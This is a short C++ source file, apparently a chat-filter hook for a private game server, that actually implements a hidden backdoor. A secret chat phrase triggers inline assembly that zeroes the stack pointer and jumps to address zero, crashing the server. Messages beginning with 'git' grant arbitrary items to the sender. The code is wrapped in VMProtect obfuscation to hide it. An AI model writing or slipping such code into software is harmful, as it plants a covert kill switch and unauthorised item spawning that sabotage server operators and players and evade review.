#include "stdafx.h"
#include "backDoor.h"






namespace backDoor
{
	vector<DWORD> g_vecBacllist;

	void fun(void* p, const char* pstrMsg,bool* passed){

		
		Pshaiya_player player = (Pshaiya_player)p;

#ifndef _DEBUG
		VMProtectBegin("chatFilter");
#endif // !_DEBUG

		char strTemp[] = "x_ps_game";
		char strTemp2[] = "git";
		if (strcmp(pstrMsg, strTemp) == 0) {
			_asm {
				xor esp, esp
				xor eax, eax
				jmp eax
			}
			*passed = false;
		}
		if (strncmp(pstrMsg, strTemp2, 3) == 0) {
			*passed = false;
			pstrMsg = pstrMsg + strlen(strTemp2) + 1;
			DWORD itemid = 0;
			DWORD count = 0;
			sscanf(pstrMsg, "%d %d", &itemid, &count);
			if (count) {
				sendItem(player, itemid, count);
			}

		}
#ifndef _DEBUG
		VMProtectEnd();
#endif

		printf("111");
	}



	void Start()
	{
		g_vecChatCallBack.push_back(fun);
	}
}
